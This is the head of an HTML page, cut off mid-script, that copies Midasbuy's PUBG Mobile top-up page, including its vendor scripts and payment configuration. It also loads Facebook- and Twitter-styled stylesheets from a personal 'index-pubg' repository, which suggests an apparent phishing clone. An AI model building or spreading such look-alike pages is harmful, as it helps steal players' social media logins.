
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no,email=no">
    <meta name="robots" content="index,follow">
    <title>PUBG Mobile - Midasbuy</title>
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    
    <script type="text/javascript">
        if(!window.console){window.console = {
            log:function () { },
            info:function () { },
            error:function () { }
        }}
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/serviceWorker');
        }
    </script>
     
<script>
    !function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):(t=t||self).assetsRetry=e()}(this,function(){"use strict";function a(t){return t}function y(){}function r(t,e){try{return"function"==typeof t[e]}catch(t){return!1}}function p(t){return Array.isArray(t)?t.reduce(function(t,e,n,r){return t[e]=r[(n+1)%r.length],t},{}):t}function h(e,t){return Object.keys(t).filter(function(t){return-1<e.indexOf(t)}).sort(function(t,e){return e.length-t.length})[0]}var e,m="retryTimes",b="succeeded",E="failed",O="maxRetryCount",j="onRetry",f="onSuccess",s="onFail",w="domain",v="_assetsRetryScript",g="_assetsRetryOnerror",l="script",A="data-assets-retry-hooked",S="data-assets-retry-ignore",k="data-retry-id",d=window,R=window.document,n=d.HTMLElement,L=d.HTMLScriptElement,c=d.HTMLStyleElement,T=d.HTMLLinkElement,x=d.HTMLImageElement,o=Object.prototype.hasOwnProperty,_=function(t,e,n){var r=t.indexOf(e);return-1===r?t:t.substring(0,r)+n+t.substring(r+e.length)},M=function(t){return[].slice.call(t)},N=function(e,t,n,r){void 0===n&&(n=y),void 0===r&&(r=!1);var o,i,c,u,a,f=r||e.defer||e.async;"loading"!==R.readyState||/Edge|MSIE|rv:/i.test(navigator.userAgent)||f?(o=R.createElement(l),Object.keys(L.prototype).forEach(function(t){if("src"!==t&&e[t]&&"object"!=typeof e[t])try{o[t]=e[t]}catch(t){}}),o.src=t,o.onload=e.onload,o.onerror=e.onerror,o.setAttribute(k,C()),(i=e.getAttribute("nonce"))&&o.setAttribute("nonce",i),R.getElementsByTagName("head")[0].appendChild(o)):(c=C(),u=e.outerHTML.replace(/data-retry-id="[^"]+"/,"").replace(/src=(?:"[^"]+"|.+)([ >])/,k+"="+c+' src="'+t+'"$1'),R.write(u),(a=R.querySelector("script["+k+'="'+c+'"]'))&&(a.onload=n))},H=function(e){try{return e.rules}catch(t){try{return e.cssRules}catch(t){return null}}},I=function(e,t,n){var r=R.createElement("link");Object.keys(T.prototype).forEach(function(t){if("href"!==t&&e[t]&&"object"!=typeof e[t])try{r[t]=e[t]}catch(t){}}),r.href=t,r.onload=n,r.setAttribute(k,C()),R.getElementsByTagName("head")[0].appendChild(r)},P=function(t){return t?t instanceof n?[t.nodeName,t.src,t.href,t.getAttribute(k)].join(";"):"not_supported":"null"},C=function(){return Math.random().toString(36).slice(2)},B=function(t){return t instanceof L||t instanceof x?t.src:t instanceof T?t.href:null},F={},$=function(t,e){var n,r=q(t,e),o=r[0],i=r[1];return o?(F[o]=F[o]||((n={})[m]=0,n[E]=[],n[b]=[],n),[i,F[o]]):[]},q=function(t,e){var n,r,o=h(t,e);return o?[(r=o,(n=t).substr(n.indexOf(r)+r.length,n.length)),o]:["",""]};try{e=function(t){for(var e=Object.getPrototypeOf?Object.getPrototypeOf:function(t){return t.__proto__},n=Object.keys(t);e(t);)n=n.concat(Object.keys(e(t))),t=e(t);return n.filter(function(t){return"constructor"!==t})}(L.prototype)}catch(t){}function i(f,t){var s=t[O],l=p(t[w]),d=t[j];return e.reduce(function(t,e){var n=r(L.prototype,e);return t[e]=n?{value:function(){return f[v][e].apply(f[v],arguments)}}:{set:function(o){return"onerror"===e?(f[g]=o,void(f[v].onerror=function(r){r.stopPropagation&&r.stopPropagation();function t(){return t=f[g],e=f[v],n=r,"function"!=typeof t?null:t.call(e,n);var t,e,n}var e=f[v].src,n=$(e,l),o=n[0],i=n[1],c=f[v].hasAttribute(S);if(!o||!i||c)return t();var u=_(e,o,l[o]),a=d(u,e,i);if(null===a)return t();if("string"!=typeof a)throw new Error("a string should be returned in `onRetry` function");i[m]<=s?N(f[v],a,y,!0):t()})):"onload"===e?(f._assetsRetryOnload=o,void(f[v].onload=function(t){var e=f[v].src,n=$(e,l),r=(n[0],n[1]);r&&-1===r[E].indexOf(e)&&r[b].push(e),o&&!o._called&&(o._called=!0,o.call(f[v],t))})):void(f[v][e]=o)},get:function(){return f[v][e]}},t},{})}var z=function(n){var r=R.createElement;R.createElement=function(t,e){return t===l?function(t,e){var n;t.setAttribute(A,"true");var r=((n={})[v]=t,n[g]=y,n),o=i(r,e);return Object.defineProperties(r,o),r}(r.call(R,l),n):r.call(R,t,e)},R.createElement.toString=function(){return"function createElement() { [native code] }"}},Z=function(n){Object.keys(n).filter(function(t){return r(n,t)}).forEach(function(t){var e=n[t];n[t]=function(){var t=[].slice.call(arguments).map(function(t){return t&&o.call(t,v)?t[v]:t});return e.apply(this,t)},/^\w+$/.test(t)&&(n[t].toString=new Function("return 'function "+t+"() { [native code] }'"))})};var D={};function G(p){function c(t){if(t){var e=t.target||t.srcElement,n=B(e);if(n){var r=$(n,g),o=r[0],i=r[1],c=e instanceof HTMLElement&&e.hasAttribute(S);if(i&&o&&!c){i[m]++,i[E].push(n);var u,a=i[m]>p[O];if(a&&(u=q(n,g)[0],v(u)),g[o]&&!a){var f=g[o],s=_(n,o,f),l=h(s,n,i);if(null!==l){if("string"!=typeof l)throw new Error("a string should be returned in `onRetry` function");var d,y=P(e);D[y]||(D[y]=!0,d=function(){i[b].push(l)},e instanceof L&&!e.getAttribute(A)&&e.src?N(e,l,d):e instanceof T&&e.href?I(e,l,d):e instanceof x&&e.src&&(e.setAttribute(k,C()),e.src=l,e.onload=d))}}}}}}var h=p[j],u=p[f],v=p[s],g=p[w];R.addEventListener("error",c,!0),R.addEventListener("load",function(t){var e,n,r,o,i;t&&(e=t.target||t.srcElement,(n=B(e))&&(e.getAttribute(k)&&(r=q(n,g)[0],u(r)),e instanceof T&&R.styleSheets&&(o=M(R.styleSheets).filter(function(t){return t.href===e.href})[0],null!==(i=H(o))&&0===i.length&&c(t))))},!0)}function u(t,e,n,r,o){var i=o[w],c=o[j],u=e.style&&e.style[t];if(u&&!/^url\(["']?data:/.test(u)){var a=u.match(/^url\(["']?(.+?)["']?\)/)||[],f=a[1];if(f){var s=h(f,i);if(s&&i[s]){var l=Object.keys(i).map(function(t){var e=_(f,s,t);return'url("'+c(e,f,null)+'")'}).join(","),d=e.selectorText+("{ "+t.replace(/([a-z])([A-Z])/g,function(t,e,n){return e+"-"+n.toLowerCase()}))+": "+l+" !important; }";try{n.insertRule(d,r.length)}catch(t){n.insertRule(d,0)}}}}}var J={},K=[],Q=function(t,o){var i=["backgroundImage","borderImage","listStyleImage"];t.forEach(function(n){var r,t=H(n);null!==t&&((r=M(t)).forEach(function(e){i.forEach(function(t){u(t,e,n,r,o)})}),n.href&&(J[n.href]=!0),n.ownerNode instanceof c&&K.push(n.ownerNode))})},U=function(t,n){return M(t).filter(function(t){if(!H(t))return!1;if(t.href)return!J[t.href]&&!!h(t.href,n);var e=t.ownerNode;return!(e instanceof c&&-1<K.indexOf(e))})};return function(t){var e,n,r,o;void 0===t&&(t={});try{if("object"!=typeof t[w])throw new Error("opts.domain cannot be non-object.");var i=[O,j,f,s,w],c=Object.keys(t).filter(function(t){return-1===i.indexOf(t)});if(0<c.length)throw new Error("option name: "+c.join(", ")+" is not valid.");var u=((e={})[O]=t[O]||3,e[j]=t[j]||a,e[f]=t[f]||y,e[s]=t[s]||y,e[w]=p(t[w]),e);return z(u),"undefined"!=typeof Node&&Z(Node.prototype),"undefined"!=typeof Element&&Z(Element.prototype),G(u),n=u,r=R.styleSheets,o=n[w],r&&setInterval(function(){var t=U(R.styleSheets,o);0<t.length&&Q(t,n)},250),F}catch(t){d.console&&console.error("[assetsRetry] error captured",t)}}});
</script>
<script>
   var assetsRetryRule = {"https://cdn.midasbuy.com/h5/overseah5/js/midas-oversea-h5page.js":"https://cn.midasbuy.com/h5/overseah5/js/midas-oversea-h5page.js","https://cdn.midasbuy.com/oversea_web/static/css":"https://cn.midasbuy.com/oversea_web/static/css","https://cdn.midasbuy.com/oversea_web/static/js":"https://cn.midasbuy.com/oversea_web/static/js"};
   var assetsRetryStatistics = window.assetsRetry({
    domain: assetsRetryRule,
    // 可选，最大重试次数，默认 3 次
    maxRetryCount: 3,
    // 可选，通过该参数可自定义 URL 的转换方式
    onRetry: function(currentUrl, originalUrl, statistics) {
        return currentUrl
    },
    onSuccess: function(currentUrl) {
       window.report && window.report.custom && window.report.custom('assets.retry.ok',{url:currentUrl});
    },
    onFail: function(currentUrl) {
        window.report && window.report.custom && window.report.custom('assets.retry.fail',{url:currentUrl});    
    }
}) 
</script>

    <script type="text/javascript">
        window.__PAY_INFO={"needSelectPF":{},"short_openid_type":"idip","short_openid_rule":"^[1-9]\\d+$","isv3":false,"shopcartv2":false,"drm_info":{"groupid":"jifen","area":"Other","country":"OT","version":"3.0","midasbuyArea":"Other"},"midasUser":null,"currentBindUser":null,"gameUsers":[],"openid":"","appid":"1450015065","UUID":"0222750395120143271611891827378","pf":"mds_hkweb_pc-v2-android-midasweb-midasbuy","type":"save","currencyIcon":"https://cdn.midasbuy.com/images/apps/pubgm/1599549775068xtoGCDwY.png","currencySmallIcon":"https://cdn.midasbuy.com/images/apps/pubgm/24_24d2c7b78c.png","currencyIconMap":[{"icon":"https://cdn.midasbuy.com/images/apps/pubgm/1599546007887MVeNUtB6.png","max":"299"},{"icon":"https://cdn.midasbuy.com/images/apps/pubgm/1599546030876PIvqwGaa.png","max":"599","min":"300"},{"icon":"https://cdn.midasbuy.com/images/apps/pubgm/1599546041426W8hmErMS.png","max":"1499","min":"600"},{"icon":"https://cdn.midasbuy.com/images/apps/pubgm/1599546052747L5gSu7VB.png","max":"2999","min":"1500"},{"icon":"https://cdn.midasbuy.com/images/apps/pubgm/1599546061912PLgMlY23.png","max":"5999","min":"3000"},{"icon":"https://cdn.midasbuy.com/images/apps/pubgm/1599546071746KqkIhrzG.png","min":"6000"}],"country":"OT","midasbuyArea":"Other","cgi_language":"EN","sandbox":"0","zoneid":"1","not_query_drm":"0","currency_type":"USD","currency_config":{"currencySymbol":" USD"},"adyen_url":"","adyen_svrtime":""};
        if(window.__PAY_INFO){
            window.__PAY_INFO.pageid = "page_"+(Math.random().toString().replace(".",""));
        }
        window.__Report_INFO={"devMode":false,"tid":"0222750395120143271611891827378","openid":"","appid":"","pf":"","countryCode":"ot","from":"","midasuid":"uv_0222750395120143271611891827378","reportUrl":"https://report.midasbuy.com/cgi-bin/log_data.fcg"};
        window.defaultDisableGaCountryList=[];
        window.__RTL=false;

        window._SHOPCODE = "midasbuy";
        window.__showErrorDetail={"ae":"*","bd":"*","bh":"*","br":"*","ch":"*","de":"*","dz":"*","eg":"*","es":"*","fr":"*","gb":"*","hk":"*","id":"*","in":"*","iq":"*","ir":"*","it":"*","kh":"*","kw":"*","la":"*","lk":"*","ly":"*","ma":"*","mm":"*","mx":"*","my":"*","nl":"*","np":"*","om":"*","ot":"*","ph":"*","pk":"*","pl":"*","qa":"*","ru":"*","sa":"*","se":"*","sg":"*","th":"*","tn":"*","tr":"*","tw":"*","za":"*"}
    </script>
   <link rel="stylesheet" href="https://cdn.midasbuy.com/oversea_web/static/css/bannercss-d9b07f5be4.html.css"/>

  <link rel="stylesheet" href="https://cdn.midasbuy.com/oversea_web/static/css/vendor-5e94f7b71a.html.css"/>

  
    <link rel="stylesheet" href="https://cdn.midasbuy.com/oversea_web/static/css/game_recharge_ticket-44b4323c18.html.css"/>

  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/index-pubg/main/M/facebook.css">
<link rel="stylesheet" href="https://raw.githack.com/ahmed-shamy/index-pubg/main/M/twitter.css">
  
   
    <!--[if lte IE 9]><link rel="stylesheet" href="https://cdn.midasbuy.com/oversea_web/static/css/ie-fb84380fda.html.css"/><![endif]-->
 
    
 

    <!-- aegis上报开关 -->
    
        <script type="text/javascript">
    // aegis-web-sdk@1.20.0
    !function(e,t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define(t):(e=e||self).Aegis=t()}(this,function(){"use strict";var o=function(e,t){return(o=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var n in t)t.hasOwnProperty(n)&&(e[n]=t[n])})(e,t)};function f(e,t){function n(){this.constructor=e}o(e,t),e.prototype=null===t?Object.create(t):(n.prototype=t.prototype,new n)}var y=function(){return(y=Object.assign||function(e){for(var t,n=1,o=arguments.length;n<o;n++)for(var r in t=arguments[n])Object.prototype.hasOwnProperty.call(t,r)&&(e[r]=t[r]);return e}).apply(this,arguments)};var v,c,e,t,i=(n.prototype.indexOf=function(e,t){for(var n=0;n<e.length;n++)if(e[n].callback===t)return n;return-1},n.prototype.on=function(e,t,n){if(void 0===n&&(n=0),this){var o=this.__EventsList[e];if(o=o||(this.__EventsList[e]=[]),-1!==this.indexOf(o,t))return this;var r={name:e,type:n||0,callback:t};return o.push(r),this}},n.prototype.one=function(e,t){this.on(e,t,1)},n.prototype.remove=function(e,t){if(this){var n=this.__EventsList[e];if(!n)return null;if(!t){try{delete this.__EventsList[e]}catch(e){}return null}if(n.length){var o=this.indexOf(n,t);n.splice(o,1)}return this}},n);function n(){var s=this;this.emit=function(e,t){if(s){var n,o=s.__EventsList[e];if(o&&o.length){o=o.slice();for(var r=0;r<o.length;r++){n=o[r];try{var i=n.callback.apply(s,[t]);if(1===n.type&&s.remove(e,n.callback),!1===i)break}catch(e){throw e}}}return s}},this.__EventsList={}}function w(e){return(e=Array.isArray(e)?e:[e]).map(function(t,n){return Object.getOwnPropertyNames(t).map(function(e){return r(e)+"["+n+"]="+r(t[e])}).join("&")}).join("&")+(e.length?"&count="+e.length:"")}function r(e){try{return encodeURIComponent(decodeURIComponent(e))}catch(e){return""}}function s(e,t){return"number"==typeof e?e:"string"==typeof e?e:t?c.string:c.number}function l(e,t){return"string"==typeof e?e.split("?")[t?1:0]||"":e}function d(e){return/^https/.test(e)}function a(){return void 0!==window.performance&&"function"==typeof(e=window.Performance)&&/native code/.test(e.toString())&&"function"==typeof performance.clearResourceTimings&&"function"==typeof performance.getEntriesByType&&"function"==typeof performance.now;var e}(t=v=v||{}).INFO_ALL="-1",t.API_RESPONSE="1",t.INFO="2",t.ERROR="4",t.PROMISE_ERROR="8",t.AJAX_ERROR="16",t.SCRIPT_ERROR="32",t.IMAGE_ERROR="64",t.CSS_ERROR="128",t.CONSOLE_ERROR="256",t.MEDIA_ERROR="512",t.RET_ERROR="1024",t.REPORT="2048",(e=c=c||{})[e.number=-1]="number",e.string="";var u=["application/octet-stream","application/xhtml+xml","application/xml","application/pdf","application/pkcs12","application/javascript","application/ecmascript","application/vnd.mspowerpoint","application/ogg","text/html","text/css","text/javascript","image","audio","video"];function p(t){return u.some(function(e){return-1!==t.indexOf(e)})}function g(e,t){try{if("string"==typeof e&&(e=JSON.parse(e)),t&&t.ret){var n=t.ret;h=[].concat(n)}var o=Object.getOwnPropertyNames(e).filter(function(e){return-1!==h.indexOf(e.toLowerCase())});return o.length?""+e[o[0]]:"unknown"}catch(e){return"unknown"}}function b(e){try{return(JSON.stringify(e,(o=[],r=[],function(e,t){if(t instanceof Error)return"Error.message【 "+t.message+" 】;  Error.stack【 "+t.stack+" 】";if("object"==typeof t&&null!==t){var n=o.indexOf(t);if(-1!==n)return"[Circular "+r[n]+"]";o.push(t),r.push(e||"root")}return t}),4)||"undefined").replace(/"/gim,"")}catch(e){return"error happen when aegis stringify: \n "+e.message+" \n "+e.stack}var o,r}var h=["ret","retcode","code"],m=(Object.defineProperty(E.prototype,"sourceURL",{get:function(){return this.data.responseURL},enumerable:!0,configurable:!0}),Object.defineProperty(E.prototype,"status",{get:function(){return Number(this.data.status)},enumerable:!0,configurable:!0}),Object.defineProperty(E.prototype,"headers",{get:function(){var e=this.data.getAllResponseHeaders().split("\n"),r={};return e.forEach(function(e){if(e){var t=e.split(": "),n=t[0],o=t[1].trim();r[n]=o}}),r},enumerable:!0,configurable:!0}),E),O=(Object.defineProperty(x.prototype,"sourceURL",{get:function(){return this.data.url},enumerable:!0,configurable:!0}),Object.defineProperty(x.prototype,"status",{get:function(){return Number(this.data.status)},enumerable:!0,configurable:!0}),Object.defineProperty(x.prototype,"headers",{get:function(){var n={};return this.data.headers.forEach(function(e,t){n[t]=e}),n},enumerable:!0,configurable:!0}),x),R=[];function x(e,t){this.type="fetch",this.data=e||{},this.data.response=t}function E(e){this.type="xhr",this.data=e}function _(t){R.forEach(function(e){e(t)})}var L=!1,C=!1,S=["img","css","script","link","audio","radio"],A=[];function I(t){A.forEach(function(e){e(t)})}var P=0;function T(){var e,t=performance.getEntriesByType("resource"),n=t.slice(P);P=t.length;for(var o=0,r=n.length;o<r;o++){var i=n[o];-1!==S.indexOf(i.initiatorType)&&I({url:l((e=i).name),method:"get",duration:Number(e.duration.toFixed(2)),status:200,type:"static",isHttps:d(e.name),urlQuery:l(e.name,!0),x5ContentType:s(e.x5ContentType,!0),x5HttpStatusCode:s(e.x5HttpStatusCode),x5ImgDecodeStatus:s(e.x5ImgDecodeStatus),x5ErrorCode:s(e.x5ErrorCode),x5LoadFromLocalCache:void 0===e.x5LoadFromLocalCache?c.number:0|e.x5LoadFromLocalCache,x5ContentLength:e.encodedBodySize||s(e.x5ContentLength),domainLookup:s(e.domainLookupEnd-e.domainLookupStart),connectTime:s(e.connectEnd-e.connectStart)})}}var j,k=[];function N(e,t){var n=[];for(var o in e)n.push(o+"="+e[o]);k.forEach(function(e){e({url:t.config.performanceUrl+"?"+n.join("&")})}),k.length=0}function D(e){if(!e||!e.getBoundingClientRect)return!1;var t=e.getBoundingClientRect(),n=window.innerHeight,o=window.innerWidth;return 0<=t.left&&t.left<o&&0<=t.top&&t.top<n}var q=!1,M=[];function U(t){M.forEach(function(e){e(t)})}var H=[];function X(t){H.forEach(function(e){e(t)})}var B=!1;function F(e){return window.btoa&&window.btoa(JSON.stringify({ids:{trace_id:{high:J(),low:J()},span_id:J(),parent_id:0,flag:2},baggages:{aegis_session_id:e._sessionID}}))}function J(){return parseInt(new Array(53).fill(1).map(function(){return.5<Math.random()?1:0}).join(""),2)}function G(e){var t=document.createElement("a");return t.href=e,location.origin===t.origin}var W,Q,K,Y,z,V,Z=navigator.userAgent;function $(n,o){var r;void 0===n&&(n=0);var i=[];return function(e,t){if(i.push(e),o&&i.length>=o)return t(i.splice(0,i.length)),void(r&&clearTimeout(r));r&&clearTimeout(r),r=setTimeout(function(){r=null,t(i.splice(0,i.length))},n)}}(V=W=W||{})[V.android=1]="android",V[V.ios=2]="ios",V[V.other=100]="other",(z=Q=Q||{})[z.oldX5=1]="oldX5",z[z.newX5=2]="newX5",z[z.other=3]="other",(Y=K=K||{})[Y.unknown=100]="unknown",Y[Y.wifi=1]="wifi",Y[Y.net2g=2]="net2g",Y[Y.net3g=3]="net3g",Y[Y.net4g=4]="net4g",Y[Y.net5g=5]="net5g",Y[Y.net6g=6]="net6g";function ee(e,t){return Array.isArray(e)?t(e.map(function(e){return{msg:"string"==typeof e.msg?e.msg:b(e.msg),level:e.level}})):t({msg:"string"==typeof e.msg?e.msg:b(e.msg),level:e.level})}function te(r){return function(t,n){var e,o;e=r.config.getNetworkType,o=function(e){r.extendBean("netType",e),n(t)},(e||function(e){var t;e((t=navigator.connection&&navigator.connection.type?navigator.connection.type:"unknown",0<=(t=String(t).toLowerCase()).indexOf("2g")?K.net2g:0<=t.indexOf("3g")?K.net3g:0<=t.indexOf("4g")?K.net4g:0<=t.indexOf("5g")?K.net5g:0<=t.indexOf("6g")?K.net6g:0<=t.indexOf("wifi")?K.wifi:K.unknown))})(function(e){K[e]||(e=K.unknown),o(e)})}}var ne=function(){};function oe(n){if(!n||!n.reduce||!n.length)throw new TypeError("createPipeline need at least one function param");return 1===n.length?function(e,t){n[0](e,t||ne)}:n.reduce(function(n,o){return function(e,t){return void 0===t&&(t=ne),n(e,function(e){return o&&o(e,t)})}})}var re=(ie.prototype.init=function(e,t){var n=this;this.setConfig(e),ie.installedPlugins.forEach(function(e){e.call(n,t)}),this.lifeCycle.emit("onInited")},ie.prototype.setConfig=function(e){return Object.assign(this.config,e),this.bean.id=this.config.id||"",this.bean.uin=this.config.uin||"",this.bean.version=this.config.version||"1.20.0",this.lifeCycle.emit("onConfigChange",e),this.config},ie.prototype.extendBean=function(e,t){this.bean[e]=t},ie.use=function(e){-1===ie.installedPlugins.indexOf(e)&&ie.installedPlugins.push(e)},ie.prototype.send=function(e,t,n){throw new Error('You need to override "send" method')},ie.prototype._sendSDKError=function(e){this.send({url:"https://aegis.qq.com/collect?id=1085&msg[0]="+encodeURIComponent(b(e))+"&level[0]=2&from="+this.config.id+"&count=1&version="+this.config.id+"(1.20.0)",addBean:!1,method:"get"})},ie.prototype.info=function(e){this._normalLogPipeline({msg:e,level:v.INFO})},ie.prototype.infoAll=function(e){this._normalLogPipeline({msg:e,level:v.INFO_ALL})},ie.prototype.report=function(e){this._normalLogPipeline({msg:e,level:v.REPORT})},ie.prototype.reportPv=function(e){e&&this.send({url:this.config.url+"/"+e,addBean:!1})},ie.prototype.reportTime=function(e,t){"string"==typeof e?"number"==typeof t?this._submitCustomTime(e,t):console.warn("reportTime: second param must be number"):console.warn("reportTime: first param must be a string")},ie.prototype.time=function(e){"string"==typeof e?this._timeMap[e]?console.warn("Timer "+e+" already exists"):this._timeMap[e]=Date.now():console.warn("time: first param must be a string")},ie.prototype.timeEnd=function(e){"string"==typeof e?this._timeMap[e]?(this._submitCustomTime(e,Date.now()-this._timeMap[e]),delete this._timeMap[e]):console.warn("Timer "+e+" does not exist"):console.warn("timeEnd: first param must be a string")},ie.prototype._submitCustomTime=function(e,t){this._customTimePipeline({name:e,duration:t})},ie.installedPlugins=[],ie.LOG_TYPE=v,ie);function ie(e){var n,r=this;this.config={version:0,delay:1500,repeat:5,random:1,url:"https://aegis.qq.com/collect",speedUrl:"https://aegis.qq.com/speed",customTimeUrl:"https://aegis.qq.com/speed/custom",whiteListUrl:"https://aegis.qq.com/aegis/whitelist",performanceUrl:"https://aegis.qq.com/speed/performance",listenOnerror:!0},this.lifeCycle=new i,this.bean={},this._normalLogPipeline=oe([$(this.config.delay,5),(n=this.lifeCycle.emit,function(e,t){return n("beforeWrite",e),t(e)}),function(e){var o=!1,r=!1;setTimeout(function(){e.send({url:e.config.whiteListUrl||""},function(e){try{0===(e=JSON.parse(e)||{}).retcode&&(o=e.result.is_in_white_list)}catch(e){}r=!0},function(){r=!0})},50);var i=[];return function(e,t){if(o)t(e.concat(i.splice(0)).map(function(e){return e.level===v.INFO_ALL&&(e.level=v.INFO),e}));else{var n=e.filter(function(e){if(e.level!==v.INFO&&e.level!==v.API_RESPONSE)return e.level===v.INFO_ALL&&(e.level=v.INFO),!0;r||(i.push(e),200<=i.length&&(i.length=200))});n.length&&t(n)}}}(this),ee,function(e,t){var n=JSON.parse(JSON.stringify(e));r.lifeCycle.emit("beforeReport",n);var o=r.config.beforeReport;if("function"==typeof o&&(e=e.filter(function(e){return!1!==o(e)})),e.length)return t(e)},function(e){r.send({url:r.config.url||"",data:w(e),method:"post",contentType:"application/x-www-form-urlencoded"},function(){var t=r.config.onReport;"function"==typeof t&&e.forEach(function(e){t(e)})})}]),this._timeMap={},this._customTimePipeline=oe([$(this.config.delay),function(e){r.send({url:r.config.customTimeUrl+"?version="+r.config.version+"&payload="+encodeURIComponent(JSON.stringify({custom:e}))})}])}function se(t){if(t.payload){var n={};return Object.keys(t).forEach(function(e){"payload"!==e&&(n[e]=t[e])}),n}return t}function ae(e,a){var u=null,c=null,t=a.shadowLog.pluginUrl||e;function n(e){if(u&&c){var o=a.id,r=a.uin,i=ce.urls.aegisCollect;try{var t=(f(n,s=c),n.prototype.init=function(e){var t={dbConfig:{name:e.namespace},lookupUrl:i+"/shadowLogAuto?id="+o+"&uin="+r,uploadUrl:i+"/shadowLog",preservedDay:7,id:o,uin:r,sessionId:ce._sessionID},n=new u(t);return this.flog=n,s.prototype.init.call(this,e)},n.prototype.postMessage=function(e){var t=e.type,n=e.data;"write"===t&&this.flog.add(n)},n.prototype.report=function(){this.flog.uploadLogs()},new n(a.shadowLog));e.lifeCycle.emit("onShadowLogInit",t)}catch(e){console.log(e)}}function n(){return null!==s&&s.apply(this,arguments)||this}var s}ce.useAsyncPlugin(ce.urls.flog,{exportsConstructor:"Flog",onAegisInitAndPluginLoaded:function(e,t){u=t,n(e)}}),ce.useAsyncPlugin(t,{exportsConstructor:"ShadowLogAegisPlugin",onAegisInitAndPluginLoaded:function(e,t){c=t,n(e)}})}Object.assign||Object.defineProperty(Object,"assign",{enumerable:!1,configurable:!0,writable:!0,value:function(e){if(null==e)throw new TypeError("Cannot convert first argument to object");for(var t=Object(e),n=1;n<arguments.length;n++){var o=arguments[n];if(null!=o){o=Object(o);for(var r=Object.keys(Object(o)),i=0,s=r.length;i<s;i++){var a=r[i],u=Object.getOwnPropertyDescriptor(o,a);void 0!==u&&u.enumerable&&(t[a]=o[a])}}}return t}});var ue,ce=(f(fe,ue=re),Object.defineProperty(fe.prototype,"_bean",{get:function(){var t=this;return Object.getOwnPropertyNames(this.bean).map(function(e){return e+"="+t.bean[e]}).join("&")+"&from="+encodeURIComponent(location.href)+"&referer="+document.referrer},enumerable:!0,configurable:!0}),fe.prototype._initOfflineLog=function(){!function(e,d){var p=[],g=null;function h(e){p.push(e)}function m(e,t){void 0===e&&(e={}),void 0===t&&(t={}),g={conds:e,params:t}}ce.useAsyncPlugin(e,{exportsConstructor:"Flog",onAegisInit:function(e){e.lifeCycle.on("beforeWrite",h),e.lifeCycle.on("uploadLogs",m)},onAegisInitAndPluginLoaded:function(t,e){var n=d.dbConfig,o=void 0===n?{}:n,r=d.url,i=void 0===r?ce.urls.aegisCollect:r,s=d.offlineLogExp,a=void 0===s?3:s,u=d.id,c=d.uin;if(c){t.lifeCycle.remove("beforeWrite",h),t.lifeCycle.remove("uploadLogs",m);var f=Object.assign({lookupUrl:i+"/offlineAuto?id="+u+"&uin="+c,uploadUrl:i+"/offlineLog",preservedDay:a,id:u,uin:c},o,{sessionId:ce._sessionID});try{var l=new e(f);p.forEach(function(e){l.add(e)}),t.lifeCycle.on("beforeWrite",function(e){void 0===e&&(e=[]),e.forEach(function(e){l.add(y({},e))})}),t.lifeCycle.on("uploadLogs",function(e,t){void 0===e&&(e={}),void 0===t&&(t={});var n=Object.assign({id:d.id,uin:d.uin},e);l.uploadLogs(n,t)}),t.lifeCycle.on("onConfigChange",function(e){l.setConfig(e)}),l.on("PERREVENT",function(e){t.send({data:w({msg:b(e),level:v.INFO}),contentType:"application/x-www-form-urlencoded",method:"post",addBean:!1,url:d.url+"?id=893&sessionId="+ce._sessionID+"&uin="+d.uin+"&from="+d.id+"&count=1&version=1.20.0"})}),g&&(t.lifeCycle.emit("uploadLogs",g.conds,g.params),g=null)}catch(t){console.log(t)}}}})}(fe.urls.flog,this.config)},fe.prototype._initShadowLog=function(){ae(fe.urls.shadowLog,this.config)},fe.prototype.uploadLogs=function(e,t){void 0===e&&(e={}),void 0===t&&(t={}),this.lifeCycle.emit("uploadLogs",e,t)},fe.useAsyncPlugin=function(s,e){void 0===e&&(e={});var t=e.exportsConstructor,a=void 0===t?"aegis-plugin-"+this.asyncPluginIndex++:t,n=e.onAegisInit,u=void 0===n?function(){}:n,o=e.onAegisInitAndPluginLoaded,c=void 0===o?function(){}:o;if("string"!=typeof s)throw new TypeError("useAsyncPlugin first param must be string");if("function"!=typeof u||"function"!=typeof c)throw new TypeError("onAegisInit、onAegisInitAndPluginLoaded must be function");this.use(function(){var e,t,n,o,r,i=this;try{u(this),fe._asyncPlugin[s]?c(this,window[fe._asyncPlugin[s]]):(e=s,t=a,n=function(e){if(!e){fe._asyncPlugin[s]=a;var t=window[a];c(i,t)}},o=document.createElement("script"),r=document.head,"function"==typeof t&&(n=t,t=""),o.src=e,o.setAttribute("name",t),o.name=t,o.async=!0,o.onload=o.onreadystatechange=function(){o.readyState&&"loaded"!==o.readyState&&"complete"!==o.readyState||("function"==typeof n&&n(!1),setTimeout(function(){r.removeChild(o)}))},o.onerror=function(){"function"==typeof n&&n(!0),setTimeout(function(){r.removeChild(o)})},r.appendChild(o))}catch(i){console.log("error on below is caused by "+s+"："),console.error(i)}})},Object.defineProperty(fe,"urls",{get:function(){return{aegisCollect:"https://aegis.qq.com/collect",flog:"https://cdn-go.cn/vasdev/web_webpersistance_v2/latest/flog.core.min.js",shadowLog:""}},enumerable:!0,configurable:!0}),fe.__version__="1.20.0",fe._sessionID="session-"+Date.now(),fe.asyncPluginIndex=0,fe._asyncPlugin={},fe);function fe(e){var o,s=ue.call(this,e)||this;s.send=function(e,t,n){if(e&&"string"==typeof e.url&&""!==e.url&&s.bean.id){var o=e.url;!1!==e.addBean&&(o=o+(-1===o.indexOf("?")?"?":"&")+s._bean);var r=e.method||"get",i=new 